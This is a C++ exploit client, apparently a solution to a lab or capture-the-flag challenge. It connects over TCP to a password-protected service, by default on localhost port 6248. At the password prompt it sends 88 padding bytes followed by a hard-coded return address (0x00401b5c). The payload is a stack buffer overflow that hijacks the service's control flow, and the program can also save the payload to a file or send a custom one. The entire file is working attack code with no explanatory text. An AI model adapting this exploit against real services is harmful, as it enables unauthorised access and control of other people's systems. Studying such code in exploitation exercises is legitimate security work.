#include <algorithm>
#include <arpa/inet.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <memory>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    int port = 6248;
    std::string ip_address = "127.0.0.1";
    std::unique_ptr<char[]> payload(new char[88 + 8 + 2]);
    int length = 88 + 8 + 2;
    for (int i = 0; i < 88; i++) {
        payload[i] = ' ';
    }
    *(reinterpret_cast<size_t *>(payload.get() + 88)) = 0x00401b5c;
    payload[88 + 8] = '\n';
    payload[88 + 9] = '\0';
    if (argc == 2) {
        std::string filaneme_for_payload = argv[1];
        std::ofstream file(filaneme_for_payload);
        file << payload.get();
        return 0;
    } else if (argc == 3) {
        port = atoi(argv[2]);
        ip_address = argv[1];
    } else if (argc == 4) {
        port = atoi(argv[2]);
        ip_address = argv[1];
        std::string filename_with_payload = argv[3];
        std::string contents;
        std::ifstream file(filename_with_payload);
        std::getline(file, contents);
        contents += "\n";
        length = contents.size();
        payload.reset(new char[length + 1]);
        std::copy(contents.begin(), contents.end(), payload.get());
    } else if (argc > 4) {
        std::cerr << "Too many arguments" << std::endl;
        return 1;
    }

    std::cout << "Connecting to: " << ip_address << ":" << port << std::endl;

    sockaddr_in server;
    int socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_descriptor == -1) {
        std::cerr << "Socket creation error" << std::endl;
        return 1;
    }
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if (inet_aton(ip_address.c_str(), &server.sin_addr) <= 0) {
        std::cerr << "Incorrect address" << std::endl;
        return 1;
    }
    int res = connect(socket_descriptor, (sockaddr *)&server, sizeof(server));
    if (res == -1) {
        std::cerr << "Connection error" << std::endl;
        return 1;
    }

    const int bufsize = 1024;
    char buffer[bufsize];
    int received = 0;

    while ((received = recv(socket_descriptor, buffer, bufsize - 1, 0)) > 0) {
        buffer[received] = '\0';
        std::cout << "Server: " << buffer;

        if (strstr(buffer, "Please enter a password to continue:") != nullptr) {
            send(socket_descriptor, payload.get(), length, 0);
            std::cout << "Sent password: '" << payload.get() << "'"
                      << std::endl;
        }

        if (strstr(buffer, "Success!") != nullptr ||
            strstr(buffer, "Disconnecting") != nullptr) {
            break;
        }
    }

    if (received < 0) {
        std::cerr << "Error receiving response" << std::endl;
    }

    close(socket_descriptor);
    return 0;
}
